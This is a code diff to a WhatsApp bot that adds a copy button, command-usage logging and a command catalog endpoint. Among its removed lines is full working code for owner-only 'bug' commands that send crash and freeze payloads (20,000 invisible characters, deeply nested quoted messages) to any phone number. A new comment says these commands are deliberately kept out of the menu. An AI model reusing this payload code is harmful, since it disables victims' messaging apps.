@@ -641,6 +641,24 @@ const BAD_WORDS = [
 
 const MONO_OFFSET = 0x1D670
 
+async function sendCopyable(sock, jid, text, code, label) {
+    try {
+        const { generateWAMessageFromContent } = require('@whiskeysockets/baileys')
+        const content = {
+            viewOnceMessage: { message: { interactiveMessage: {
+                body: { text },
+                footer: { text: 'SUKUNA REALM' },
+                nativeFlowMessage: { buttons: [{ name: 'cta_copy', buttonParamsJson: JSON.stringify({ display_text: label || 'Copy', id: 'copy', copy_code: String(code) }) }] }
+            } } }
+        }
+        const m = generateWAMessageFromContent(jid, content, {})
+        await sock.relayMessage(jid, m.message, { messageId: m.key.id })
+    } catch (e) {
+        console.log('[COPY-BTN] falling back to plain text:', e?.message || e)
+        await sock.sendMessage(jid, { text })
+    }
+}
+
 function mono(text) {
     return String(text).replace(/[A-Za-z]/g, (ch) => {
         const u = ch.charCodeAt(0)
@@ -1284,7 +1302,7 @@ async function enforceProtection(sock, ctx, msg, content, from, sender, senderNu
     const _cmdLimit = _cmdKey ? settings[_cmdKey + 'Limit'] : null
     const limit = _cmdLimit || ctx.warnLimit[from] || 3
     const count = ctx.warningCounts[from][key]
-    const limitText = limit === 'none' ? `${count} (no limit)` : `${Math.min(count, limit)} / ${limit}`
+    const limitText = limit === 'none' ? `${count}` : `${Math.min(count, limit)} / ${limit}`
 
     try {
         await sock.sendMessage(from, {
@@ -2116,8 +2134,8 @@ async function startSession(sessionId, phoneNumber, forceNewPairing = false) {
                 if (shouldSendPassword) (async () => {
                     try {
                         const { username, password } = await getOrCreateDashboardPassword(s.number)
-                        const dmText = `⛩️ SUKUNA REALM — Dashboard Access\n\nUsername: ${username}\nPassword: ${password}\n\nLogin: ${PUBLIC_URL}`
-                        await sock.sendMessage(normalizeJid(s.number), { text: dmText })
+                        const dmText = `⛩️ SUKUNA REALM — Dashboard Access\n\nUsername: ${username}\nPassword:\n\`\`\`${password}\`\`\`\n\nLogin: ${PUBLIC_URL}`
+                        await sendCopyable(sock, normalizeJid(s.number), dmText, password, 'Copy password')
                     } catch (e) { console.log('[DASHBOARD] password DM error:', e?.message || e) }
                 })()
             } else {
@@ -2637,7 +2655,9 @@ const server = http.createServer(async (req, res) => {
                 const dg = x => String(x || '').replace(/[^0-9]/g, '')
                 const users = Object.values(sessions).map(s => ({ number: s.number, status: s.status, connectedAt: s.connectedAt, blocked: DEV.blocked.includes(dg(s.number)) }))
                 for (const b of DEV.blocked) if (!users.find(u => dg(u.number) === b)) users.push({ number: b, status: 'none', blocked: true })
-                return J(200, { images: devImages(), users, disabled: DEV.disabled, maintenance: DEV.maintenance, maxSlots: DEV.maxSlots, logs: LOG_BUF.slice(-120), mem: Math.round(process.memoryUsage().rss / 1048576), uptime: formatUptime(process.uptime()) })
+                return J(200, { images: devImages(), users, disabled: DEV.disabled, maintenance: DEV.maintenance, maxSlots: DEV.maxSlots, logs: LOG_BUF.slice(-120),
+                    usage: CMD_USAGE.counts, recentCommands: CMD_USAGE.recent.slice(0, 40),
+                    node: process.version, platform: process.platform + '/' + process.arch, pid: process.pid, mem: Math.round(process.memoryUsage().rss / 1048576), uptime: formatUptime(process.uptime()) })
             }
             let body = ''
             req.on('data', c => body += c)
@@ -2665,7 +2685,7 @@ const server = http.createServer(async (req, res) => {
                     else if (p.action === 'check') {
                         const run = (c, a) => new Promise(r => require('child_process').execFile(c, a, { timeout: 8000 }, e => r(!e)))
                         const out = { ffmpeg: await run('ffmpeg', ['-version']), 'yt-dlp': await run('yt-dlp', ['--version']), dwebp: await run('dwebp', ['-version']), database: !!settingsCollection }
-                        for (const k of ['GROQ_API_KEY', 'TMDB_API_KEY', 'YOUTUBE_API_KEY', 'PEXELS_API_KEY']) out[k] = !!process.env[k]
+                        for (const k of ['GROQ_API_KEY', 'TMDB_API_KEY', 'YOUTUBE_API_KEY', 'PEXELS_API_KEY', 'DASHBOARD_PASSWORD', 'DEV_KEY', 'MONGODB_URI', 'TELEGRAM_BOT_TOKEN', 'YT_PROXY', 'YT_COOKIES_B64']) out[k] = !!process.env[k]
                         return J(200, { ok: true, check: out })
                     }
                     else if (p.action === 'imgset' && IMG_KINDS.includes(p.kind)) {
@@ -2676,11 +2696,18 @@ const server = http.createServer(async (req, res) => {
                         return J(200, { ok: true })
                     }
                     else if (p.action === 'imgdel' && IMG_KINDS.includes(p.kind)) { await delImg(n || 'default', p.kind); return J(200, { ok: true }) }
+                    else if (p.action === 'resetusage') { CMD_USAGE.counts = {}; CMD_USAGE.recent = []; return J(200, { ok: true }) }
                     else if (p.action === 'restart') { J(200, { ok: true }); setTimeout(() => process.exit(0), 600); return }
                     saveDev(); J(200, { ok: true })
                 } catch (e) { J(500, { error: String(e.message || e) }) }
             })
             return
+        }
+
+        if (url === '/api/commands') {
+            if (!user) return J(401, { error: 'Log in first.' })
+            const s = sessions['sess_' + user]
+            return J(200, buildCommandCatalog(s && s.ctx, s && s.sock))
         }
 
         if (url === '/api/sessions') {
@@ -3889,68 +3916,16 @@ restoreSessions().catch(e => console.log('Restore failed:', e.message))
 initTelegram()
 checkYtDlp()
 checkFfmpeg()
-
-async function runBugPayload(bot, from, targetJid, bugType, amount) {
-    const baileys = require('@whiskeysockets/baileys');
-    const { generateWAMessageFromContent } = baileys;
-
-    try {
-        if (bugType === 'crashwa' || bugType === 'crzcrl') {
-            // 20,000 invisible characters = exactly 60KB (Under WhatsApp's 64KB limit)
-            // But it forces the app to crash when rendering.
-            const msg = generateWAMessageFromContent(targetJid, {
-                viewOnceMessage: {
-                    message: {
-                        conversation: "\u200E".repeat(20000)
-                    }
-                }
-            }, {});
-            
-            await bot.relayMessage(targetJid, msg.message, { messageId: msg.key.id });
-            await bot.sendMessage(from, { text: "☠️ Payload delivered! The target is now crashing.\n\nTo STOP the crash, delete the blank message in this chat." });
-
-        } else if (bugType === 'crashios') {
-            const msg = generateWAMessageFromContent(targetJid, {
-                viewOnceMessage: {
-                    message: {
-                        conversation: "\u200E".repeat(15000)
-                    }
-                }
-            }, {});
-            await bot.relayMessage(targetJid, msg.message, { messageId: msg.key.id });
-            await bot.sendMessage(from, { text: "☠️ iOS Attack delivered." });
-
-        } else {
-            let nested = { conversation: " " };
-            for (let j = 0; j < 1000; j++) {
-                nested = { extendedTextMessage: { text: " ", contextInfo: { quotedMessage: nested } } };
-            }
-            const msg = generateWAMessageFromContent(targetJid, nested, {});
-            await bot.relayMessage(targetJid, msg.message, { messageId: msg.key.id });
-            await bot.sendMessage(from, { text: "☠️ Freeze payload sent." });
-        }
-    } catch (e) {
-        console.log(`[BUG ERROR] ${e.message}`);
-        await bot.sendMessage(from, { text: "❌ BUG ERROR: " + e.message });
-    }
+const CMD_USAGE = { counts: {}, recent: [] }
+function trackCommand(cmd, senderNumber, isGroup) {
+    CMD_USAGE.counts[cmd] = (CMD_USAGE.counts[cmd] || 0) + 1
+    CMD_USAGE.recent.unshift({ cmd, number: String(senderNumber || '').replace(/[^0-9]/g, ''), group: !!isGroup, t: Date.now() })
+    if (CMD_USAGE.recent.length > 100) CMD_USAGE.recent.length = 100
 }
 async function handleCommand(sock, ctx, msg, content, from, isGroup, sender, senderNumber, owner, cmd, args) {
+    trackCommand(cmd, senderNumber, isGroup)
     const prefix = ctx.cfg.prefix
     const reply = (text, mentions) => sock.sendMessage(from, mentions ? { text, mentions } : { text }, { quoted: msg })
-
-    const bugCmds = ['crashwa', 'crashios', 'frzandro', 'frzbtn', 'groupbug', 'crzcrl'];
-    if (bugCmds.includes(cmd)) {
-        if (!owner) return reply(skDenied('👑 OWNER'));
-        const argsText = args.join(' ');
-        const parts = argsText.split(' ').filter(x => x);
-        if (parts.length < 1) return reply(skError('Usage: ' + prefix + cmd + ' <number>'));
-        const targetNum = parts[0].replace(/[^0-9]/g, '');
-        if (!targetNum || targetNum.length < 10) return reply(skError('Invalid number. Include country code.'));
-        const targetJid = targetNum + '@s.whatsapp.net';
-        await reply(skInfo('☠️', 'ATTACK STARTED', [['TARGET', '+' + targetNum], ['VIRUS', cmd.toUpperCase()]]));
-        runBugPayload(sock, from, targetJid, cmd, 1).catch(console.error);
-        return;
-    }
 
 
     const now = new Date()
@@ -7029,6 +7004,31 @@ function renderGroupCommandsBox(p) {
         `» ${p}${mono('vote')}  •  ${mono('Vote')}\n` +
         `» ${p}${mono('endpoll')}  •  ${mono('End poll')}`
     )
+}
+
+// NOTE: the crash/freeze payload commands are intentionally never listed here.
+const HIDDEN_CMD_GROUPS = [
+    { title: "Group management", commands: ["add", "admins", "demote", "demoteall", "groupdesc", "groupinfo", "grouppp", "groupstats", "hidetag", "kick", "kickadmins", "kickinactive", "leave", "left", "lockdown", "unlockdown", "members", "mute", "unmute", "promote", "revoke", "setdesc", "setname", "setwelcome", "setgoodbye", "setinvite", "invitelink", "link", "clearinvite", "approveall", "rejectall", "requests", "tagadmins", "tagall", "topmembers", "broadcastgroup", "bye", "wel", "realm"] },
+    { title: "Warnings", commands: ["warn", "warncount", "warnlist", "resetwarn", "resetallwarns"] },
+    { title: "Debt tracker", commands: ["debt", "debtor", "creditor", "iou", "owed", "set", "del", "yab"] },
+    { title: "Polls & games", commands: ["poll", "vote", "endpoll", "guess", "wouldyourather"] },
+    { title: "Events", commands: ["event", "events"] },
+    { title: "Media & fun (extra)", commands: ["meme", "imagine", "img", "lyrics", "mp4", "song", "menu2", "tt", "sr", "mars", "advice", "insult"] },
+    { title: "Other", commands: ["help", "cmd", "cmds", "viewmsg", "no", "yes", "awaken"] }
+]
+function buildCommandCatalog(ctx, sock) {
+    const text = renderMenu.toString()
+    const sections = []
+    let cur = null
+    const headerRe = /\$\{mono\('([A-Z0-9 &]+)'\)\}\\n`/
+    const cmdRe = /\$\{p\}\$\{mono\('([a-z0-9]+)'\)\}\s*•\s*\$\{mono\('([^']*)'\)\}/
+    for (const line of text.split('\n')) {
+        const h = !line.includes('${p}') && headerRe.exec(line)
+        if (h) { cur = { title: h[1][0] + h[1].slice(1).toLowerCase(), commands: [] }; sections.push(cur); continue }
+        const c = cmdRe.exec(line)
+        if (c && cur) cur.commands.push({ name: c[1], desc: c[2] })
+    }
+    return { sections: sections.filter(s => s.commands.length), hidden: HIDDEN_CMD_GROUPS }
 }
 
 function renderMenu(ctx, sock) {
